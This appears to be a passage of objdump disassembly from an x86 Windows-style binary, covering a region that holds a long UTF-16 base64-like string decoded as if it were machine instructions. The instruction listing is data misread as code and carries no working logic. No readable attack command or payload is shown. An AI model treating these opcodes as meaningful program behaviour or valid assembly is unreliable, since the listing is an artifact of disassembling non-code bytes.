  405cb9:	53                   	push   %ebx
  405cba:	00 75 00             	add    %dh,0x0(%ebp)
  405cbd:	57                   	push   %edi
  405cbe:	00 2f                	add    %ch,(%edi)
  405cc0:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  405cc4:	00 53 00             	add    %dl,0x0(%ebx)
  405cc7:	4f                   	dec    %edi
  405cc8:	00 53 00             	add    %dl,0x0(%ebx)
  405ccb:	2b 00                	sub    (%eax),%eax
  405ccd:	47                   	inc    %edi
  405cce:	00 33                	add    %dh,(%ebx)
  405cd0:	00 34 00             	add    %dh,(%eax,%eax,1)
  405cd3:	5a                   	pop    %edx
  405cd4:	00 33                	add    %dh,(%ebx)
  405cd6:	00 4f 00             	add    %cl,0x0(%edi)
  405cd9:	74 00                	je     0x405cdb
  405cdb:	34 00                	xor    $0x0,%al
  405cdd:	2f                   	das
  405cde:	00 6f 00             	add    %ch,0x0(%edi)
  405ce1:	35 00 42 00 39       	xor    $0x39004200,%eax
  405ce6:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  405cea:	00 4e 00             	add    %cl,0x0(%esi)
  405ced:	63 00                	arpl   %eax,(%eax)
  405cef:	6c                   	insb   (%dx),%es:(%edi)
  405cf0:	00 48 00             	add    %cl,0x0(%eax)
  405cf3:	6e                   	outsb  %ds:(%esi),(%dx)
  405cf4:	00 66 00             	add    %ah,0x0(%esi)
  405cf7:	57                   	push   %edi
  405cf8:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  405cfc:	00 57 00             	add    %dl,0x0(%edi)
  405cff:	38 00                	cmp    %al,(%eax)
  405d01:	57                   	push   %edi
  405d02:	00 68 00             	add    %ch,0x0(%eax)
  405d05:	71 00                	jno    0x405d07
  405d07:	39 00                	cmp    %eax,(%eax)
  405d09:	5a                   	pop    %edx
  405d0a:	00 72 00             	add    %dh,0x0(%edx)
  405d0d:	31 00                	xor    %eax,(%eax)
  405d0f:	31 00                	xor    %eax,(%eax)
  405d11:	72 00                	jb     0x405d13
  405d13:	46                   	inc    %esi
  405d14:	00 53 00             	add    %dl,0x0(%ebx)
  405d17:	41                   	inc    %ecx
  405d18:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  405d1c:	00 67 00             	add    %ah,0x0(%edi)
  405d1f:	5a                   	pop    %edx
  405d20:	00 32                	add    %dh,(%edx)
  405d22:	00 71 00             	add    %dh,0x0(%ecx)
  405d25:	68 00 54 00 55       	push   $0x55005400
  405d2a:	00 68 00             	add    %ch,0x0(%eax)
  405d2d:	39 00                	cmp    %eax,(%eax)
  405d2f:	55                   	push   %ebp
  405d30:	00 55 00             	add    %dl,0x0(%ebp)
  405d33:	6b 00 72             	imul   $0x72,(%eax),%eax
  405d36:	00 79 00             	add    %bh,0x0(%ecx)
  405d39:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  405d3d:	71 00                	jno    0x405d3f
  405d3f:	6e                   	outsb  %ds:(%esi),(%dx)
  405d40:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  405d44:	00 34 00             	add    %dh,(%eax,%eax,1)
  405d47:	31 00                	xor    %eax,(%eax)
  405d49:	35 00 2b 00 6e       	xor    $0x6e002b00,%eax
  405d4e:	00 6d 00             	add    %ch,0x0(%ebp)
  405d51:	2f                   	das
  405d52:	00 36                	add    %dh,(%esi)
  405d54:	00 59 00             	add    %bl,0x0(%ecx)
  405d57:	41                   	inc    %ecx
  405d58:	00 69 00             	add    %ch,0x0(%ecx)
  405d5b:	4b                   	dec    %ebx
  405d5c:	00 35 00 34 00 70    	add    %dh,0x70003400
  405d62:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  405d66:	00 58 00             	add    %bl,0x0(%eax)
  405d69:	31 00                	xor    %eax,(%eax)
  405d6b:	54                   	push   %esp
  405d6c:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  405d70:	00 51 00             	add    %dl,0x0(%ecx)
  405d73:	30 00                	xor    %al,(%eax)
  405d75:	39 00                	cmp    %eax,(%eax)
  405d77:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  405d7b:	4f                   	dec    %edi
  405d7c:	00 59 00             	add    %bl,0x0(%ecx)
  405d7f:	45                   	inc    %ebp
  405d80:	00 6d 00             	add    %ch,0x0(%ebp)
  405d83:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  405d87:	6e                   	outsb  %ds:(%esi),(%dx)
  405d88:	00 4a 00             	add    %cl,0x0(%edx)
  405d8b:	5a                   	pop    %edx
  405d8c:	00 6a 00             	add    %ch,0x0(%edx)
  405d8f:	58                   	pop    %eax
  405d90:	00 2f                	add    %ch,(%edi)
  405d92:	00 66 00             	add    %ah,0x0(%esi)
  405d95:	33 00                	xor    (%eax),%eax
  405d97:	56                   	push   %esi
  405d98:	00 67 00             	add    %ah,0x0(%edi)
  405d9b:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  405d9f:	54                   	push   %esp
  405da0:	00 79 00             	add    %bh,0x0(%ecx)
  405da3:	73 00                	jae    0x405da5
  405da5:	61                   	popa
  405da6:	00 7a 00             	add    %bh,0x0(%edx)
  405da9:	68 00 76 00 76       	push   $0x76007600
  405dae:	00 4d 00             	add    %cl,0x0(%ebp)
  405db1:	45                   	inc    %ebp
  405db2:	00 31                	add    %dh,(%ecx)
  405db4:	00 4d 00             	add    %cl,0x0(%ebp)
  405db7:	30 00                	xor    %al,(%eax)
  405db9:	7a 00                	jp     0x405dbb
  405dbb:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  405dbf:	4e                   	dec    %esi
  405dc0:	00 50 00             	add    %dl,0x0(%eax)
  405dc3:	4a                   	dec    %edx
  405dc4:	00 49 00             	add    %cl,0x0(%ecx)
  405dc7:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  405dcb:	43                   	inc    %ebx
  405dcc:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  405dd0:	00 38                	add    %bh,(%eax)
  405dd2:	00 70 00             	add    %dh,0x0(%eax)
  405dd5:	58                   	pop    %eax
  405dd6:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  405dda:	00 56 00             	add    %dl,0x0(%esi)
  405ddd:	34 00                	xor    $0x0,%al
  405ddf:	69 00 57 00 37 00    	imul   $0x370057,(%eax),%eax
  405de5:	42                   	inc    %edx
  405de6:	00 6a 00             	add    %ch,0x0(%edx)
  405de9:	6d                   	insl   (%dx),%es:(%edi)
  405dea:	00 66 00             	add    %ah,0x0(%esi)
  405ded:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  405df1:	46                   	inc    %esi
  405df2:	00 6d 00             	add    %ch,0x0(%ebp)
  405df5:	75 00                	jne    0x405df7
  405df7:	48                   	dec    %eax
  405df8:	00 7a 00             	add    %bh,0x0(%edx)
  405dfb:	4b                   	dec    %ebx
  405dfc:	00 41 00             	add    %al,0x0(%ecx)
  405dff:	6a 00                	push   $0x0
  405e01:	6b 00 43             	imul   $0x43,(%eax),%eax
  405e04:	00 4b 00             	add    %cl,0x0(%ebx)
  405e07:	32 00                	xor    (%eax),%al
  405e09:	50                   	push   %eax
  405e0a:	00 66 00             	add    %ah,0x0(%esi)
  405e0d:	32 00                	xor    (%eax),%al
  405e0f:	71 00                	jno    0x405e11
  405e11:	69 00 50 00 6c 00    	imul   $0x6c0050,(%eax),%eax
  405e17:	42                   	inc    %edx
  405e18:	00 45 00             	add    %al,0x0(%ebp)
  405e1b:	69 00 6d 00 47 00    	imul   $0x47006d,(%eax),%eax
  405e21:	77 00                	ja     0x405e23
  405e23:	56                   	push   %esi
  405e24:	00 6e 00             	add    %ch,0x0(%esi)
  405e27:	49                   	dec    %ecx
  405e28:	00 47 00             	add    %al,0x0(%edi)
  405e2b:	6d                   	insl   (%dx),%es:(%edi)
  405e2c:	00 32                	add    %dh,(%edx)
  405e2e:	00 4e 00             	add    %cl,0x0(%esi)
  405e31:	48                   	dec    %eax
  405e32:	00 4e 00             	add    %cl,0x0(%esi)
  405e35:	62 00                	bound  %eax,(%eax)
  405e37:	49                   	dec    %ecx
  405e38:	00 6a 00             	add    %ch,0x0(%edx)
  405e3b:	5a                   	pop    %edx
  405e3c:	00 4e 00             	add    %cl,0x0(%esi)
  405e3f:	65 00 54 00 42       	add    %dl,%gs:0x42(%eax,%eax,1)
  405e44:	00 66 00             	add    %ah,0x0(%esi)
  405e47:	4e                   	dec    %esi
  405e48:	00 32                	add    %dh,(%edx)
  405e4a:	00 52 00             	add    %dl,0x0(%edx)
  405e4d:	5a                   	pop    %edx
  405e4e:	00 58 00             	add    %bl,0x0(%eax)
  405e51:	4e                   	dec    %esi
  405e52:	00 51 00             	add    %dl,0x0(%ecx)
  405e55:	2f                   	das
  405e56:	00 6b 00             	add    %ch,0x0(%ebx)
  405e59:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  405e5d:	43                   	inc    %ebx
  405e5e:	00 46 00             	add    %al,0x0(%esi)
  405e61:	58                   	pop    %eax
  405e62:	00 50 00             	add    %dl,0x0(%eax)
  405e65:	4a                   	dec    %edx
  405e66:	00 6e 00             	add    %ch,0x0(%esi)
  405e69:	6e                   	outsb  %ds:(%esi),(%dx)
  405e6a:	00 47 00             	add    %al,0x0(%edi)
  405e6d:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  405e71:	44                   	inc    %esp
  405e72:	00 35 00 51 00 4f    	add    %dh,0x4f005100
  405e78:	00 4a 00             	add    %cl,0x0(%edx)
  405e7b:	78 00                	js     0x405e7d
  405e7d:	6a 00                	push   $0x0
  405e7f:	74 00                	je     0x405e81
  405e81:	78 00                	js     0x405e83
  405e83:	62 00                	bound  %eax,(%eax)
  405e85:	74 00                	je     0x405e87
  405e87:	4d                   	dec    %ebp
  405e88:	00 2b                	add    %ch,(%ebx)
  405e8a:	00 61 00             	add    %ah,0x0(%ecx)
  405e8d:	31 00                	xor    %eax,(%eax)
  405e8f:	70 00                	jo     0x405e91
  405e91:	6c                   	insb   (%dx),%es:(%edi)
  405e92:	00 38                	add    %bh,(%eax)
  405e94:	00 43 00             	add    %al,0x0(%ebx)
  405e97:	76 00                	jbe    0x405e99
  405e99:	63 00                	arpl   %eax,(%eax)
  405e9b:	31 00                	xor    %eax,(%eax)
  405e9d:	6c                   	insb   (%dx),%es:(%edi)
  405e9e:	00 70 00             	add    %dh,0x0(%eax)
  405ea1:	75 00                	jne    0x405ea3
  405ea3:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  405ea7:	67 00 54 00          	add    %dl,0x0(%si)
  405eab:	4f                   	dec    %edi
  405eac:	00 62 00             	add    %ah,0x0(%edx)
  405eaf:	59                   	pop    %ecx
  405eb0:	00 48 00             	add    %cl,0x0(%eax)
  405eb3:	31 00                	xor    %eax,(%eax)
  405eb5:	77 00                	ja     0x405eb7
  405eb7:	4a                   	dec    %edx
  405eb8:	00 68 00             	add    %ch,0x0(%eax)
  405ebb:	49                   	dec    %ecx
  405ebc:	00 52 00             	add    %dl,0x0(%edx)
  405ebf:	44                   	inc    %esp
  405ec0:	00 4d 00             	add    %cl,0x0(%ebp)
  405ec3:	5a                   	pop    %edx
  405ec4:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  405ec8:	00 4c 00 2f          	add    %cl,0x2f(%eax,%eax,1)
  405ecc:	00 4f 00             	add    %cl,0x0(%edi)
  405ecf:	79 00                	jns    0x405ed1
  405ed1:	6d                   	insl   (%dx),%es:(%edi)
  405ed2:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  405ed6:	00 68 00             	add    %ch,0x0(%eax)
  405ed9:	65 00 39             	add    %bh,%gs:(%ecx)
  405edc:	00 4d 00             	add    %cl,0x0(%ebp)
  405edf:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  405ee3:	77 00                	ja     0x405ee5
  405ee5:	30 00                	xor    %al,(%eax)
  405ee7:	56                   	push   %esi
  405ee8:	00 76 00             	add    %dh,0x0(%esi)
  405eeb:	64 00 31             	add    %dh,%fs:(%ecx)
  405eee:	00 77 00             	add    %dh,0x0(%edi)
  405ef1:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  405ef5:	69 00 66 00 62 00    	imul   $0x620066,(%eax),%eax
  405efb:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  405efe:	00 53 00             	add    %dl,0x0(%ebx)
  405f01:	78 00                	js     0x405f03
  405f03:	39 00                	cmp    %eax,(%eax)
  405f05:	51                   	push   %ecx
  405f06:	00 66 00             	add    %ah,0x0(%esi)
  405f09:	5a                   	pop    %edx
  405f0a:	00 38                	add    %bh,(%eax)
  405f0c:	00 6b 00             	add    %ch,0x0(%ebx)
  405f0f:	72 00                	jb     0x405f11
  405f11:	6a 00                	push   $0x0
  405f13:	48                   	dec    %eax
  405f14:	00 33                	add    %dh,(%ebx)
  405f16:	00 52 00             	add    %dl,0x0(%edx)
  405f19:	5a                   	pop    %edx
  405f1a:	00 33                	add    %dh,(%ebx)
  405f1c:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  405f20:	00 59 00             	add    %bl,0x0(%ecx)
  405f23:	35 00 76 00 4a       	xor    $0x4a007600,%eax
  405f28:	00 77 00             	add    %dh,0x0(%edi)
  405f2b:	4a                   	dec    %edx
  405f2c:	00 76 00             	add    %dh,0x0(%esi)
  405f2f:	50                   	push   %eax
  405f30:	00 61 00             	add    %ah,0x0(%ecx)
  405f33:	4a                   	dec    %edx
  405f34:	00 2f                	add    %ch,(%edi)
  405f36:	00 4f 00             	add    %cl,0x0(%edi)
  405f39:	57                   	push   %edi
  405f3a:	00 72 00             	add    %dh,0x0(%edx)
  405f3d:	4a                   	dec    %edx
  405f3e:	00 68 00             	add    %ch,0x0(%eax)
  405f41:	61                   	popa
  405f42:	00 5a 00             	add    %bl,0x0(%edx)
  405f45:	50                   	push   %eax
  405f46:	00 56 00             	add    %dl,0x0(%esi)
  405f49:	4a                   	dec    %edx
  405f4a:	00 55 00             	add    %dl,0x0(%ebp)
  405f4d:	73 00                	jae    0x405f4f
  405f4f:	62 00                	bound  %eax,(%eax)
  405f51:	69 00 38 00 43 00    	imul   $0x430038,(%eax),%eax
  405f57:	72 00                	jb     0x405f59
  405f59:	5a                   	pop    %edx
  405f5a:	00 39                	add    %bh,(%ecx)
  405f5c:	00 75 00             	add    %dh,0x0(%ebp)
  405f5f:	2f                   	das
  405f60:	00 70 00             	add    %dh,0x0(%eax)
  405f63:	6c                   	insb   (%dx),%es:(%edi)
  405f64:	00 4e 00             	add    %cl,0x0(%esi)
  405f67:	47                   	inc    %edi
  405f68:	00 55 00             	add    %dl,0x0(%ebp)
  405f6b:	58                   	pop    %eax
  405f6c:	00 37                	add    %dh,(%edi)
  405f6e:	00 42 00             	add    %al,0x0(%edx)
  405f71:	6b 00 56             	imul   $0x56,(%eax),%eax
  405f74:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  405f78:	00 6b 00             	add    %ch,0x0(%ebx)
  405f7b:	4d                   	dec    %ebp
  405f7c:	00 56 00             	add    %dl,0x0(%esi)
  405f7f:	77 00                	ja     0x405f81
  405f81:	4d                   	dec    %ebp
  405f82:	00 48 00             	add    %cl,0x0(%eax)
  405f85:	79 00                	jns    0x405f87
  405f87:	31 00                	xor    %eax,(%eax)
  405f89:	7a 00                	jp     0x405f8b
  405f8b:	55                   	push   %ebp
  405f8c:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  405f90:	00 7a 00             	add    %bh,0x0(%edx)
  405f93:	6c                   	insb   (%dx),%es:(%edi)
  405f94:	00 46 00             	add    %al,0x0(%esi)
  405f97:	53                   	push   %ebx
  405f98:	00 31                	add    %dh,(%ecx)
  405f9a:	00 65 00             	add    %ah,0x0(%ebp)
  405f9d:	32 00                	xor    (%eax),%al
  405f9f:	46                   	inc    %esi
  405fa0:	00 36                	add    %dh,(%esi)
  405fa2:	00 57 00             	add    %dl,0x0(%edi)
  405fa5:	37                   	aaa
  405fa6:	00 50 00             	add    %dl,0x0(%eax)
  405fa9:	4e                   	dec    %esi
  405faa:	00 50 00             	add    %dl,0x0(%eax)
  405fad:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  405fb1:	37                   	aaa
  405fb2:	00 30                	add    %dh,(%eax)
  405fb4:	00 4b 00             	add    %cl,0x0(%ebx)
  405fb7:	53                   	push   %ebx
  405fb8:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  405fbc:	00 47 00             	add    %al,0x0(%edi)
  405fbf:	34 00                	xor    $0x0,%al
  405fc1:	31 00                	xor    %eax,(%eax)
  405fc3:	56                   	push   %esi
  405fc4:	00 57 00             	add    %dl,0x0(%edi)
  405fc7:	37                   	aaa
  405fc8:	00 63 00             	add    %ah,0x0(%ebx)
  405fcb:	69 00 45 00 69 00    	imul   $0x690045,(%eax),%eax
  405fd1:	58                   	pop    %eax
  405fd2:	00 6f 00             	add    %ch,0x0(%edi)
  405fd5:	4d                   	dec    %ebp
  405fd6:	00 5a 00             	add    %bl,0x0(%edx)
  405fd9:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  405fdc:	00 57 00             	add    %dl,0x0(%edi)
  405fdf:	58                   	pop    %eax
  405fe0:	00 6e 00             	add    %ch,0x0(%esi)
  405fe3:	49                   	dec    %ecx
  405fe4:	00 4b 00             	add    %cl,0x0(%ebx)
  405fe7:	49                   	dec    %ecx
  405fe8:	00 6b 00             	add    %ch,0x0(%ebx)
  405feb:	6a 00                	push   $0x0
  405fed:	33 00                	xor    (%eax),%eax
  405fef:	34 00                	xor    $0x0,%al
  405ff1:	51                   	push   %ecx
  405ff2:	00 73 00             	add    %dh,0x0(%ebx)
  405ff5:	4e                   	dec    %esi
  405ff6:	00 7a 00             	add    %bh,0x0(%edx)
  405ff9:	4c                   	dec    %esp
  405ffa:	00 49 00             	add    %cl,0x0(%ecx)
  405ffd:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  406001:	62 00                	bound  %eax,(%eax)
  406003:	66 00 2b             	data16 add %ch,(%ebx)
  406006:	00 36                	add    %dh,(%esi)
  406008:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40600c:	00 35 00 66 00 61    	add    %dh,0x61006600
  406012:	00 72 00             	add    %dh,0x0(%edx)
  406015:	62 00                	bound  %eax,(%eax)
  406017:	37                   	aaa
  406018:	00 76 00             	add    %dh,0x0(%esi)
  40601b:	5a                   	pop    %edx
  40601c:	00 65 00             	add    %ah,0x0(%ebp)
  40601f:	78 00                	js     0x406021
  406021:	79 00                	jns    0x406023
  406023:	57                   	push   %edi
  406024:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  406028:	00 2b                	add    %ch,(%ebx)
  40602a:	00 5a 00             	add    %bl,0x0(%edx)
  40602d:	48                   	dec    %eax
  40602e:	00 6e 00             	add    %ch,0x0(%esi)
  406031:	4b                   	dec    %ebx
  406032:	00 71 00             	add    %dh,0x0(%ecx)
  406035:	68 00 73 00 57       	push   $0x57007300
  40603a:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40603e:	00 4b 00             	add    %cl,0x0(%ebx)
  406041:	55                   	push   %ebp
  406042:	00 4b 00             	add    %cl,0x0(%ebx)
  406045:	6b 00 32             	imul   $0x32,(%eax),%eax
  406048:	00 63 00             	add    %ah,0x0(%ebx)
  40604b:	76 00                	jbe    0x40604d
  40604d:	79 00                	jns    0x40604f
  40604f:	77 00                	ja     0x406051
  406051:	50                   	push   %eax
  406052:	00 56 00             	add    %dl,0x0(%esi)
  406055:	66 00 62 00          	data16 add %ah,0x0(%edx)
  406059:	69 00 4e 00 49 00    	imul   $0x49004e,(%eax),%eax
  40605f:	4d                   	dec    %ebp
  406060:	00 39                	add    %bh,(%ecx)
  406062:	00 56 00             	add    %dl,0x0(%esi)
  406065:	67 00 56 00          	add    %dl,0x0(%bp)
  406069:	71 00                	jno    0x40606b
  40606b:	47                   	inc    %edi
  40606c:	00 66 00             	add    %ah,0x0(%esi)
  40606f:	4e                   	dec    %esi
  406070:	00 48 00             	add    %cl,0x0(%eax)
  406073:	71 00                	jno    0x406075
  406075:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  406079:	43                   	inc    %ebx
  40607a:	00 35 00 42 00 36    	add    %dh,0x36004200
  406080:	00 71 00             	add    %dh,0x0(%ecx)
  406083:	47                   	inc    %edi
  406084:	00 31                	add    %dh,(%ecx)
  406086:	00 65 00             	add    %ah,0x0(%ebp)
  406089:	76 00                	jbe    0x40608b
  40608b:	39 00                	cmp    %eax,(%eax)
  40608d:	79 00                	jns    0x40608f
  40608f:	70 00                	jo     0x406091
  406091:	32 00                	xor    (%eax),%al
  406093:	47                   	inc    %edi
  406094:	00 4f 00             	add    %cl,0x0(%edi)
  406097:	54                   	push   %esp
  406098:	00 76 00             	add    %dh,0x0(%esi)
  40609b:	5a                   	pop    %edx
  40609c:	00 46 00             	add    %al,0x0(%esi)
  40609f:	6c                   	insb   (%dx),%es:(%edi)
  4060a0:	00 6b 00             	add    %ch,0x0(%ebx)
  4060a3:	68 00 70 00 54       	push   $0x54007000
  4060a8:	00 42 00             	add    %al,0x0(%edx)
  4060ab:	77 00                	ja     0x4060ad
  4060ad:	45                   	inc    %ebp
  4060ae:	00 48 00             	add    %cl,0x0(%eax)
  4060b1:	2b 00                	sub    (%eax),%eax
  4060b3:	43                   	inc    %ebx
  4060b4:	00 43 00             	add    %al,0x0(%ebx)
  4060b7:	31 00                	xor    %eax,(%eax)
  4060b9:	4e                   	dec    %esi
  4060ba:	00 57 00             	add    %dl,0x0(%edi)
  4060bd:	35 00 72 00 65       	xor    $0x65007200,%eax
  4060c2:	00 32                	add    %dh,(%edx)
  4060c4:	00 32                	add    %dh,(%edx)
  4060c6:	00 70 00             	add    %dh,0x0(%eax)
  4060c9:	38 00                	cmp    %al,(%eax)
  4060cb:	4d                   	dec    %ebp
  4060cc:	00 42 00             	add    %al,0x0(%edx)
  4060cf:	35 00 6a 00 42       	xor    $0x42006a00,%eax
  4060d4:	00 58 00             	add    %bl,0x0(%eax)
  4060d7:	4c                   	dec    %esp
  4060d8:	00 6b 00             	add    %ch,0x0(%ebx)
  4060db:	4a                   	dec    %edx
  4060dc:	00 37                	add    %dh,(%edi)
  4060de:	00 58 00             	add    %bl,0x0(%eax)
  4060e1:	51                   	push   %ecx
  4060e2:	00 34 00             	add    %dh,(%eax,%eax,1)
  4060e5:	67 00 2b             	add    %ch,(%bp,%di)
  4060e8:	00 30                	add    %dh,(%eax)
  4060ea:	00 62 00             	add    %ah,0x0(%edx)
  4060ed:	69 00 44 00 41 00    	imul   $0x410044,(%eax),%eax
  4060f3:	2f                   	das
  4060f4:	00 69 00             	add    %ch,0x0(%ecx)
  4060f7:	47                   	inc    %edi
  4060f8:	00 2f                	add    %ch,(%edi)
  4060fa:	00 5a 00             	add    %bl,0x0(%edx)
  4060fd:	34 00                	xor    $0x0,%al
  4060ff:	4a                   	dec    %edx
  406100:	00 31                	add    %dh,(%ecx)
  406102:	00 65 00             	add    %ah,0x0(%ebp)
  406105:	51                   	push   %ecx
  406106:	00 4f 00             	add    %cl,0x0(%edi)
  406109:	6c                   	insb   (%dx),%es:(%edi)
  40610a:	00 56 00             	add    %dl,0x0(%esi)
  40610d:	44                   	inc    %esp
  40610e:	00 2f                	add    %ch,(%edi)
  406110:	00 33                	add    %dh,(%ebx)
  406112:	00 2b                	add    %ch,(%ebx)
  406114:	00 43 00             	add    %al,0x0(%ebx)
  406117:	75 00                	jne    0x406119
  406119:	33 00                	xor    (%eax),%eax
  40611b:	4c                   	dec    %esp
  40611c:	00 6b 00             	add    %ch,0x0(%ebx)
  40611f:	2f                   	das
  406120:	00 4f 00             	add    %cl,0x0(%edi)
  406123:	49                   	dec    %ecx
  406124:	00 77 00             	add    %dh,0x0(%edi)
  406127:	31 00                	xor    %eax,(%eax)
  406129:	42                   	inc    %edx
  40612a:	00 65 00             	add    %ah,0x0(%ebp)
  40612d:	56                   	push   %esi
  40612e:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
  406132:	00 71 00             	add    %dh,0x0(%ecx)
  406135:	37                   	aaa
  406136:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40613a:	00 2b                	add    %ch,(%ebx)
  40613c:	00 73 00             	add    %dh,0x0(%ebx)
  40613f:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  406143:	50                   	push   %eax
  406144:	00 45 00             	add    %al,0x0(%ebp)
  406147:	35 00 45 00 68       	xor    $0x68004500,%eax
  40614c:	00 56 00             	add    %dl,0x0(%esi)
  40614f:	32 00                	xor    (%eax),%al
  406151:	5a                   	pop    %edx
  406152:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  406156:	00 76 00             	add    %dh,0x0(%esi)
  406159:	50                   	push   %eax
  40615a:	00 33                	add    %dh,(%ebx)
  40615c:	00 71 00             	add    %dh,0x0(%ecx)
  40615f:	33 00                	xor    (%eax),%eax
  406161:	4b                   	dec    %ebx
  406162:	00 4d 00             	add    %cl,0x0(%ebp)
  406165:	55                   	push   %ebp
  406166:	00 67 00             	add    %ah,0x0(%edi)
  406169:	71 00                	jno    0x40616b
  40616b:	78 00                	js     0x40616d
  40616d:	73 00                	jae    0x40616f
  40616f:	6e                   	outsb  %ds:(%esi),(%dx)
  406170:	00 4b 00             	add    %cl,0x0(%ebx)
  406173:	39 00                	cmp    %eax,(%eax)
  406175:	6f                   	outsl  %ds:(%esi),(%dx)
  406176:	00 4d 00             	add    %cl,0x0(%ebp)
  406179:	77 00                	ja     0x40617b
  40617b:	45                   	inc    %ebp
  40617c:	00 35 00 67 00 42    	add    %dh,0x42006700
  406182:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  406186:	00 5a 00             	add    %bl,0x0(%edx)
  406189:	63 00                	arpl   %eax,(%eax)
  40618b:	4e                   	dec    %esi
  40618c:	00 36                	add    %dh,(%esi)
  40618e:	00 58 00             	add    %bl,0x0(%eax)
  406191:	5a                   	pop    %edx
  406192:	00 75 00             	add    %dh,0x0(%ebp)
  406195:	6e                   	outsb  %ds:(%esi),(%dx)
  406196:	00 49 00             	add    %cl,0x0(%ecx)
  406199:	33 00                	xor    (%eax),%eax
  40619b:	45                   	inc    %ebp
  40619c:	00 68 00             	add    %ch,0x0(%eax)
  40619f:	6a 00                	push   $0x0
  4061a1:	76 00                	jbe    0x4061a3
  4061a3:	48                   	dec    %eax
  4061a4:	00 6e 00             	add    %ch,0x0(%esi)
  4061a7:	70 00                	jo     0x4061a9
  4061a9:	52                   	push   %edx
  4061aa:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  4061ae:	00 2b                	add    %ch,(%ebx)
  4061b0:	00 62 00             	add    %ah,0x0(%edx)
  4061b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4061b4:	00 57 00             	add    %dl,0x0(%edi)
  4061b7:	4f                   	dec    %edi
  4061b8:	00 61 00             	add    %ah,0x0(%ecx)
  4061bb:	6c                   	insb   (%dx),%es:(%edi)
  4061bc:	00 52 00             	add    %dl,0x0(%edx)
  4061bf:	76 00                	jbe    0x4061c1
  4061c1:	49                   	dec    %ecx
  4061c2:	00 6d 00             	add    %ch,0x0(%ebp)
  4061c5:	4c                   	dec    %esp
  4061c6:	00 61 00             	add    %ah,0x0(%ecx)
  4061c9:	5a                   	pop    %edx
  4061ca:	00 2b                	add    %ch,(%ebx)
  4061cc:	00 47 00             	add    %al,0x0(%edi)
  4061cf:	56                   	push   %esi
  4061d0:	00 77 00             	add    %dh,0x0(%edi)
  4061d3:	45                   	inc    %ebp
  4061d4:	00 48 00             	add    %cl,0x0(%eax)
  4061d7:	6c                   	insb   (%dx),%es:(%edi)
  4061d8:	00 38                	add    %bh,(%eax)
  4061da:	00 6f 00             	add    %ch,0x0(%edi)
  4061dd:	56                   	push   %esi
  4061de:	00 63 00             	add    %ah,0x0(%ebx)
  4061e1:	77 00                	ja     0x4061e3
  4061e3:	34 00                	xor    $0x0,%al
  4061e5:	32 00                	xor    (%eax),%al
  4061e7:	58                   	pop    %eax
  4061e8:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  4061ec:	00 49 00             	add    %cl,0x0(%ecx)
  4061ef:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  4061f3:	47                   	inc    %edi
  4061f4:	00 4d 00             	add    %cl,0x0(%ebp)
  4061f7:	53                   	push   %ebx
  4061f8:	00 6f 00             	add    %ch,0x0(%edi)
  4061fb:	78 00                	js     0x4061fd
  4061fd:	61                   	popa
  4061fe:	00 30                	add    %dh,(%eax)
  406200:	00 4e 00             	add    %cl,0x0(%esi)
  406203:	5a                   	pop    %edx
  406204:	00 39                	add    %bh,(%ecx)
  406206:	00 78 00             	add    %bh,0x0(%eax)
  406209:	49                   	dec    %ecx
  40620a:	00 30                	add    %dh,(%eax)
  40620c:	00 65 00             	add    %ah,0x0(%ebp)
  40620f:	6c                   	insb   (%dx),%es:(%edi)
  406210:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  406214:	00 75 00             	add    %dh,0x0(%ebp)
  406217:	69 00 7a 00 4b 00    	imul   $0x4b007a,(%eax),%eax
  40621d:	48                   	dec    %eax
  40621e:	00 4e 00             	add    %cl,0x0(%esi)
  406221:	4a                   	dec    %edx
  406222:	00 58 00             	add    %bl,0x0(%eax)
  406225:	48                   	dec    %eax
  406226:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40622a:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40622e:	00 6b 00             	add    %ch,0x0(%ebx)
  406231:	4f                   	dec    %edi
  406232:	00 4f 00             	add    %cl,0x0(%edi)
